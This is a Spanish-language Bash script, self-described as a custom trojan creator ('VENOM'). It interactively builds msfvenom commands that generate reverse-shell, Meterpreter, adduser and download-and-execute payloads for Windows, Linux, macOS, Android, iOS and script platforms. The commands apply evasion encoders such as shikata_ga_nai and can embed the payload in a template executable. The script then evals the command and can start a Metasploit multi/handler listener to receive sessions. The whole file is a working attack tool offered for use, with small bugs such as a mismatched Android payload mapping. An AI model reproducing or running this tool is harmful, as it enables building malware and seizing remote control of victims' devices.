#!/bin/bash

#Script: Creación personalizada de troyanos
#Autor: Pablo Rubio
#Email: paruma@protonmail.ch
#Versión: 1.0 '2019'
#Requisitos: Metasploit Framework

function intro() {
clear
echo '++++++++++++++++++++VENOM++++++++++++++++++++'
echo '+++++++++++++++++++++++++++++++++++++++++++++'
echo '+ CREACION PERSONALIZADA DE VIRUS BY PABLO  +' 
echo '+++++++++++++++++++++++++++++++++++++++++++++'
echo '+++++++++++++++++++++1.0+++++++++++++++++++++'
echo ''
} #Fin intro()

function salir() {
clear
intro
echo '.Saliendo.'
echo '.Bye.'
exit
} #Fin salir()

function error(){
clear
intro
echo '.Opcion incorrecta.'
echo '.Bye.'
exit
} #Fin error()

function crear_troyano () {
echo 'Introduza sistema objetivo'
echo '1-)  Windows'
echo '2-)  Linux'
echo '3-)  OSX'
echo '4-)  Android'
echo '5-)  Apple IOS'
echo '6-)  Unix'
echo '7-)  PHP'
echo '8-)  Python'
echo '9-)  Ruby'
echo '10-) Java'
echo '11-) Multi'
echo ''
echo '0-) Salir'
read sistema_objetivo

case $sistema_objetivo in
	1) #Windows
	sistema_objetivo='windows'
	;;
	2) #Linux
	sistema_objetivo='linux'
	;;
	3) #OSX
	sistema_objetivo='osx'
	;;
	4) #Android
	sistema_objetivo='android'
	;;
	5) #Apple_IOS
	sistema_objetivo='apple_ios'
	;;
	6) #Unix
	sistema_objetivo='unix'
	;;
	7) #PHP
	sistema_objetivo='php'
	;;
	8) #Python
	sistema_objetivo='python'
	;;
	9) #Ruby
	sistema_objetivo='ruby'
	;;
	10) #Java
	sistema_objetivo='java'
	;;
	11) #Multi
	sistema_objetivo='multi'
	;;
	0*) #Opción Salir
	salir
	;;
	*) #Opción default
	error
	;;
esac

clear
intro
echo '[+] Objetivo -> '$sistema_objetivo
echo ''
echo 'Payloads disponibles:'

case "$sistema_objetivo" in
	"windows") #Windows
	echo '1-)  windows/meterpreter/bind_tcp'
	echo '2-)  windows/meterpreter/reverse_tcp'
	echo '3-)  windows/meterpreter/reverse_http'
	echo '4-)  windows/meterpreter/reverse_https'
	echo '5-)  windows/powershell_bind_tcp'
	echo '6-)  windows/powershell_reverse_tcp'
	echo '7-)  windows/shell/bind_tcp'
	echo '8-)  windows/shell/reverse_tcp'
	echo '9-)  cmd/windows/adduser'
	echo '10-) windows/x64/exec'
	echo '99-) ...'
	;;
	"linux") #Linux
	echo '1-)  linux/x64/meterpreter/bind_tcp'
	echo '2-)  linux/x64/meterpreter/reverse_tcp'
	echo '3-)  linux/x64/shell/bind_tcp'
	echo '4-)  linux/x64/shell/reverse_tcp'
	echo '5-)  linux/x86/meterpreter/bind_tcp'
	echo '6-)  linux/x86/meterpreter/reverse_tcp'
	echo '7-)  linux/x86/shell/bind_tcp'
	echo '8-)  linux/x86/shell/reverse_tcp'
	echo '9-)  linux/x86/adduser'
	echo '10-) linux/x64/exec'
	echo '11-) linux/x86/exec'
	echo '99-) ...'
	;;
	"osx") #OSX
	echo '1-)  osx/x64/shell/bind_tcp'
	echo '2-)  osx/x64/shell/reverse_tcp'
	echo '3-)  osx/x64/meterpreter/bind_tcp'
	echo '4-)  osx/x64/meterpreter/reverse_tcp' 
	echo '5-)  osx/x86/shell_bind_tcp'
	echo '6-)  osx/x86/shell_reverse_tcp'
	echo '7-)  osx/ppc/shell_bind_tcp'
	echo '8-)  osx/ppc/shell_reverse_tcp' 
	echo '9-)  osx/x86/exec'
	echo '99-) ...'
	;;
	"android") #Android
	echo '1-)  android/meterpreter/reverse_http'
	echo '2-)  android/meterpreter/reverse_https'
	echo '3-)  android/meterpreter/reverse_tcp'
	echo '4-)  android/meterpreter_reverse_http' 
	echo '5-)  android/meterpreter_reverse_https'
	echo '6-)  android/meterpreter_reverse_tcp'
	echo '7-)  android/shell/reverse_http'
	echo '8-)  android/shell/reverse_https' 
	echo '9-)  android/shell/reverse_tcp'
	echo '99-) ...'
	;;
	"apple_ios") #Apple_IOS
	echo '1-)  apple_ios/aarch64/meterpreter_reverse_http'
	echo '2-)  apple_ios/aarch64/meterpreter_reverse_https'
	echo '3-)  apple_ios/aarch64/meterpreter_reverse_tcp'
	echo '4-)  apple_ios/aarch64/shell_reverse_tcp' 
	echo '5-)  apple_ios/armle/meterpreter_reverse_http'
	echo '6-)  apple_ios/armle/meterpreter_reverse_https'
	echo '7-)  apple_ios/armle/meterpreter_reverse_tcp'
	echo '99-) ...'
	;;
	"unix") #Unix
	echo '1-)  cmd/unix/reverse_bash' 
	echo '99-) ...'
	;;
	"php") #PHP
	echo '1-)  php/bind_php'
	echo '2-)  php/reverse_php'
	echo '3-)  php/meterpreter/bind_tcp'
	echo '4-)  php/meterpreter/reverse_tcp'
	echo '5-)  php/exec'
	echo '6-)  php/download_exec'
	echo '99-) ...'
	;;
	"python") #Python
	echo '1-)  python/meterpreter/bind_tcp'
	echo '2-)  python/meterpreter/reverse_tcp'
	echo '3-)  python/shell_bind_tcp'
	echo '4-)  python/shell_reverse_tcp'
	echo '5-)  python/shell_reverse_tcp_ssl'
	echo '99-) ...'
	;;
	"ruby") #Ruby
	echo '1-)  ruby/shell_bind_tcp'
	echo '2-)  ruby/shell_reverse_tcp'
	echo '3-)  ruby/shell_reverse_tcp_ssl'
	echo '99-) ...'
	;;
	"java") #Java
	echo '1-)  java/meterpreter/bind_tcp'
	echo '2-)  java/meterpreter/reverse_tcp'
	echo '3-)  java/shell/bind_tcp'
	echo '4-)  java/shell/reverse_tcp'
	echo '99-) ...'
	;;
	"multi") #Multi
	echo '1-)  multi/meterpreter/reverse_http'
	echo '2-)  multi/meterpreter/reverse_https'
	echo '99-) ...'
	;;
	*) #Opción default
	error
	;;
esac

echo '0-) Salir'
echo ''
echo 'Introduzca Payload:'
read payload

if (($payload != 99)); then
	case $sistema_objetivo in
		"windows") #Windows
			case $payload in
				1)
				payload='windows/meterpreter/bind_tcp'
				;;
				2)
				payload='windows/meterpreter/reverse_tcp'
				;;
				3)
				payload='windows/meterpreter/reverse_http'
				;;
				4)
				payload='windows/meterpreter/reverse_https'
				;;
				5)
				payload='windows/powershell_bind_tcp'
				;;
				6)
				payload='windows/powershell_reverse_tcp'
				;;
				7)
				payload='windows/shell/bind_tcp'
				;;
				8)
				payload='windows/shell/reverse_tcp'
				;;
				9)
				payload='cmd/windows/adduser'
				;;
				10)
				payload='windows/x64/exec'
				;;
				*)error;;
			esac
		;;
		"linux") #Linux
			case $payload in
				1)
				payload='linux/x64/meterpreter/bind_tcp'
				;;
				2)
				payload='linux/x64/meterpreter/reverse_tcp'
				;;
				3)
				payload='linux/x64/shell/bind_tcp'
				;;
				4)
				payload='linux/x64/shell/reverse_tcp'
				;;
				5)
				payload='linux/x86/meterpreter/bind_tcp'
				;;
				6)
				payload='linux/x86/meterpreter/reverse_tcp'
				;;
				7)
				payload='linux/x86/shell/bind_tcp'
				;;
				8)
				payload='linux/x86/shell/reverse_tcp'
				;;
				9)
				payload='linux/x86/adduser'
				;;
				10)
				payload='linux/x64/exec'
				;;
				11)
				payload='linux/x86/exec'
				;;
				*)error;;
			esac
		;;
		"osx") #OSX
			case $payload in
				1)
				payload='osx/x64/shell/bind_tcp'
				;;
				2)
				payload='osx/x64/shell/reverse_tcp'
				;;
				3)
				payload='osx/x64/meterpreter/bind_tcp'
				;;
				4)
				payload='osx/x64/meterpreter/reverse_tcp'
				;;
				5)
				payload='osx/x86/shell_bind_tcp'
				;;
				6)
				payload='osx/x86/shell_reverse_tcp'
				;;
				7)
				payload='osx/ppc/shell_bind_tcp'
				;;
				8)
				payload='osx/ppc/shell_reverse_tcp'
				;;
				9)
				payload='osx/x86/exec'
				;;
				*)error;;
			esac
		;;
		"android") #Android
			case $payload in
				1)
				payload='android/meterpreter/reverse_http'
				;;
				2)
				payload='android/meterpreter/reverse_https'
				;;
				3)
				payload='android/meterpreter/reverse_tcp'
				;;
				4)
				payload='android/meterpreter_reverse_http'
				;;
				5)
				payload='windows/powershell_bind_tcp'
				;;
				6)
				payload='android/meterpreter_reverse_tcp'
				;;
				7)
				payload='android/shell/reverse_http'
				;;
				8)
				payload='android/shell/reverse_https'
				;;
				9)
				payload='android/shell/reverse_tcp'
				;;
				*)error;;
			esac
		;;
		"apple_ios") #Apple_IOS
			case $payload in
				1)
				payload='apple_ios/aarch64/meterpreter_reverse_http'
				;;
				2)
				payload='apple_ios/aarch64/meterpreter_reverse_https'
				;;
				3)
				payload='apple_ios/aarch64/meterpreter_reverse_tcp'
				;;
				4)
				payload='apple_ios/aarch64/shell_reverse_tcp'
				;;
				5)
				payload='apple_ios/armle/meterpreter_reverse_http'
				;;
				6)
				payload='apple_ios/armle/meterpreter_reverse_https'
				;;
				7)
				payload='apple_ios/armle/meterpreter_reverse_tcp'
				;;
				*)error;;
			esac
		;;
		"unix") #Unix
			case $payload in
				1)
				payload='cmd/unix/reverse_bash'
				;;
				*)error;;
			esac
		;;
		"php") #PHP
			case $payload in
				1)
				payload='php/bind_php'
				;;
				2)
				payload='php/reverse_php'
				;;
				3)
				payload='php/meterpreter/bind_tcp'
				;;
				4)
				payload='php/meterpreter/reverse_tcp'
				;;
				5)
				payload='php/exec'
				;;
				6)
				payload='php/download_exec'
				;;
				*)error;;
			esac
		;;
		"python") #Python
			case $payload in
				1)
				payload='python/meterpreter/bind_tcp'
				;;
				2)
				payload='python/meterpreter/reverse_tcp'
				;;
				3)
				payload='python/shell_bind_tcp'
				;;
				4)
				payload='python/shell_reverse_tcp'
				;;
				5)
				payload='python/shell_reverse_tcp_ssl'
				;;
				*)error;;
			esac
		;;
		"ruby") #Ruby
			case $payload in
				1)
				payload='ruby/shell_bind_tcp'
				;;
				2)
				payload='ruby/shell_reverse_tcp'
				;;
				3)
				payload='ruby/shell_reverse_tcp_ssl'
				;;
				*)error;;
			esac
		;;
		"java") #Java
			case $payload in
				1)
				payload='java/meterpreter/bind_tcp'
				;;
				2)
				payload='java/meterpreter/reverse_tcp'
				;;
				3)
				payload='java/shell/bind_tcp'
				;;
				4)
				payload='java/shell/reverse_tcp'
				;;
				*)error;;
			esac
		;;
		"multi") #Multi
			case $payload in
				1)
				payload='multi/meterpreter/reverse_http'
				;;
				2)
				payload='multi/meterpreter/reverse_https'
				;;
				*)error;;
			esac
		;;
		0*) #Opción Salir
		salir
		;;
		*) #Opción default
		error
		;;
	esac
else
	echo 'Introduce payload especifico:'
	read payload
fi


clear
intro
echo '[+] Objetivo -> '$sistema_objetivo
echo '[+] Payload  -> '$payload
echo ''
echo 'Arquitecturas disponibles:'
echo ''
echo '1-)  x64'
echo '2-)  x86'
echo '3-)  x86_64'
echo '99-) ...'
echo '0-)  Salir'
read arquitectura

if (($arquitectura != 99)); then
	case $arquitectura in
		1)
		arquitectura='x64'
		;;
		2)
		arquitectura='x86'
		;;
		3)
		arquitectura='x86_64'
		;;
		0*)
		salir
		;;
		*)error;;
	esac
else
	echo 'Introduce arquitectura especifica:'
	read arquitectura
fi

clear
intro
echo '[+] Objetivo     -> '$sistema_objetivo
echo '[+] Payload      -> '$payload
echo '[+] Arquitectura -> '$arquitectura
echo ''
echo 'Encoders disponibles:'
echo '1-)  x86/shikata_ga_nai'
echo '2-)  x64/xor'
echo '3-)  cmd/powershell_base64'
echo '4-)  ppc/longxor'
echo '5-)  php/base64'
echo '6-)  ruby/base64'
echo '7-)  generic/none'
echo '99-) ...'
echo '0-)  Salir'
echo ''
echo 'Introduzca endoder:'
read encoder

if (($encoder != 99)); then
	case $encoder in
	1)
	encoder='x86/shikata_ga_nai'
	;;
	2)
	encoder='x64/xor'
	;;
	3)
	encoder='cmd/powershell_base64'
	;;
	4)
	encoder='ppc/longxor'
	;;
	5)
	encoder='php/base64'
	;;
	6)
	encoder='ruby/base64'
	;;
	7)
	encoder='generic/none'
	;;
	*)error;;
	esac
else
	echo 'Introduzca encoder especifico:'
	read encoder
fi

echo 'Iteraciones del encoder:'
read iteraciones

if (($iteraciones <= 0)); then
	iteraciones=1
elif [ -z "$iteraciones" ]; then
	iteraciones=1
fi

clear
intro
echo '[+] Objetivo     -> '$sistema_objetivo
echo '[+] Payload      -> '$payload
echo '[+] Arquitectura -> '$arquitectura
echo '[+] Encoder      -> '$encoder
echo '[+] Iteraciones  -> '$iteraciones
echo ''

echo '¿Desea ejecutar el payload en un hilo secundario? (Si/No) (No se recomienda en sistemas nuevos)'
read hilo
case $hilo in
	s*)
	hilo=1
	;;
	S*)
	hilo=1
	;;
	n*)
	hilo=0
	;;
	N*)
	hilo=0
	;;
	*)error;;
esac

echo '¿Desea usar alguna plantilla? (Si/No)'
read plantilla
case $plantilla in
	s*)
	plantilla=1
	;;
	S*)
	plantilla=1
	;;
	n*)
	plantilla=0
	;;
	N*)
	plantilla=0
	;;
	*)error;;
esac
if (($plantilla == 1)); then
	echo 'Introduzca la ruta de la plantilla:'
	read ruta
	if [ -f $ruta ]; then
		echo 'Plantilla correcta'
	else
		echo '.No existe la plantilla.'
		echo '.Bye.'
		exit
	fi
else
	ruta='No'
fi

echo '¿Desea eliminar el caracter "\x00\xff"? (Si/No)'
read bit0
case $bit0 in
	s*)
	bit0=1
	;;
	S*)
	bit0=1
	;;
	n*)
	bit0=0
	;;
	N*)
	bit0=0
	;;
	*)error;;
esac

echo 'Introduzca tu direccion IP:'
read LHOST
echo 'Introduzca el puerto:'
read LPORT

clear
intro
echo '[+] Objetivo      -> '$sistema_objetivo
echo '[+] Payload       -> '$payload
echo '[+] Arquitectura  -> '$arquitectura
echo '[+] Encoder       -> '$encoder
echo '[+] Iteraciones   -> '$iteraciones
echo '[+] Plantilla     -> '$ruta
if (( $hilo == 1 )); then
	echo '[+] Hilo aparte   -> Si'
else
	echo '[+] Hilo aparte   -> No'
fi
if (( $bit0 == 1 )); then
	echo '[+] Eliminar \x00\xff -> Si'
else
	echo '[+] Eliminar \x00\xff -> No'
fi
echo '[+] LHOST         -> '$LHOST
echo '[+] LPORT         -> '$LPORT
echo ''

case $sistema_objetivo in
	"windows") #Windows
	extension='exe'
	;;
	"linux") #Linux
	extension='elf'
	;;
	"osx") #OSX
	extension='macho'
	;;
	"android") #Android
	extension='apk'
	;;
	"apple_ios") #Apple_IOS
	extension='ipa'
	;;
	"unix") #Unix
	extension='elf'
	;;
	*) #Default
	extension='X'
	;;
esac

read -rsp $'Pulsa cualquier tecla para continuar\n' -n1 key
clear
intro
echo ''
case $extension in
	"X")
		echo 'Extensiones disponibles:'
		echo '1-)  .exe'
		echo '2-)  .elf'
		echo '3-)  .macho'
		echo '4-)  .apk'
		echo '5-)  .ipa'
		echo '6-)  .jsp'
		echo '7-)  .war'
		echo '8-)  .jar'
		echo '9-)  .dll'
		echo '10-) .py'
		echo '11-) .rb'
		echo '12-) .java'
		echo '13-) .php'
		echo '99-) ...'
		echo ''
		echo 'Extension a utilizar:'
		flag=0
	;;
	*)
		echo '¿Utilizar la extension '$extension'? (Si/No)'
		flag=1
	;;
esac

read eleccion
if (( $flag == 1 )); then
	case $eleccion in
		n*)
		flag=0
		;;
		N*)
		flag=0
		;;
		*);;
	esac
fi

if (( $flag == 0 )); then
	if (( $eleccion == 99 )); then
		echo 'Introduzca extension (sin .):'
		read extension
	else
		case $eleccion in
			1)
			extension='exe'
			;;
			2)
			extension='elf'
			;;
			3)
			extension='macho'
			;;
			4)
			extension='apk'
			;;
			5)
			extension='ipa'
			;;
			6)
			extension='jsp'
			;;
			7)
			extension='war'
			;;
			8)
			extension='jar'
			;;
			9)
			extension='dll'
			;;
			10)
			extension='py'
			;;
			11)
			extension='rb'
			;;
			12)
			extension='java'
			;;
			13)
			extension='php'
			;;
			*);;
		esac
	fi
fi

echo ''
echo 'Introduzca el nombre del ejecutable final:'
read ex
if [ -z "$ex" ]; then
	ex='venom'
fi



clear
intro
echo '[+] Objetivo      -> '$sistema_objetivo
echo '[+] Payload       -> '$payload
echo '[+] Arquitectura  -> '$arquitectura
echo '[+] Encoder       -> '$encoder
echo '[+] Iteraciones   -> '$iteraciones
echo '[+] Plantilla     -> '$ruta
if (( $hilo == 1 )); then
	echo '[+] Hilo aparte   -> Si'
else
	echo '[+] Hilo aparte   -> No'
fi
if (( $bit0 == 1 )); then
	echo '[+] Eliminar \x00\xff -> Si'
else
	echo '[+] Eliminar \x00\xff -> No'
fi
echo '[+] LHOST         -> '$LHOST
echo '[+] LPORT         -> '$LPORT
echo '[+] Extension     -> '$extension
echo '[+] Nombre        -> '$ex
echo ''
read -rsp $'Pulse cualquier tecla para finalizar.\n' -n1 key

# msfvenom -a ARCH -p PAYLOAD -f FORMAT -e ENCODER -i ITERATIONS -x TEMPLATE lhost=IP lport=PORT -k THREAD > ejecutable.extension

ejecucion='msfvenom -a '$arquitectura' -p '$payload' -e '$encoder' -i '$iteraciones' lhost='$LHOST' lport='$LPORT''

if (( $hilo == 1 )); then
	ejecucion="$ejecucion -k "
fi
if (( $bit0 == 1 )); then
	ejecucion="$ejecucion -b '\x00\xff'"
fi
if (( $plantilla == 1 )); then
	ejecucion="$ejecucion -x $ruta "
fi

ejecucion="$ejecucion -f $extension "

#añadir nombre archivo final
ejecucion="$ejecucion  > $ex.$extension"
echo $ejecucion
echo 'Creando virus, espere...'
eval $ejecucion

clear
intro 
echo '¿Desea dejar un listener esperando conexión? (Si/No)' 
read resp
case $resp in
	s*)
	list=1
	;;
	S*)
	list=1
	;;
	n*)
	list=0
	;;
	N*)
	list=0
	;;
	*)error;;
esac

if (( $list == 1 )); then
	echo 'Creando listener, espere...'
	cat /dev/null > listener.rc
	echo 'use exploit/multi/handler ' >> listener.rc
	echo 'set PAYLOAD $payload' >> listener.rc
	echo 'set LHOST '$LHOST '' >> listener.rc
	echo 'set LPORT '$LPORT ''>> listener.rc
	echo 'set ExitOnSession false' >> listener.rc
	echo 'run' >> listener.rc
	eval 'msfconsole -r listener.rc'
fi

} #Fin crear_troyano()



function crear_listener () {
clear
intro
echo 'Introduzca su dirección IP:'
read ip
echo 'Introduzca el puerto a escuchar:'
read port
echo 'Introduzca el payload que va a usar la conexión:'
read payload
echo ''
echo 'Creando listener, espere...'
	cat /dev/null > listener.rc
	echo 'use exploit/multi/handler ' >> listener.rc
	echo 'set PAYLOAD '$payload '' >> listener.rc
	echo 'set LHOST '$ip '' >> listener.rc
	echo 'set LPORT '$port '' >> listener.rc
	echo 'set ExitOnSession false' >> listener.rc
	echo 'run' >> listener.rc
	eval 'msfconsole -r listener.rc'
} #Fin crear_listener()


########################################################################
##############################-MAIN-####################################
########################################################################


intro
echo '1-) Crear troyano'
echo '2-) Crear listener'
echo '0-) Salir'
echo ''
echo 'Introduzca opcion:'
read opcion

case $opcion in	

	1*) #Opción crear troyano
	clear
	intro
	crear_troyano
	;;

	2*) #Opción crear listener
	clear
	intro
	crear_listener
	;;

	0*) #Opción Salir
	salir
	;;

	*) #Opción default
	error
	;;
esac


########################################################################
########################################################################
########################################################################
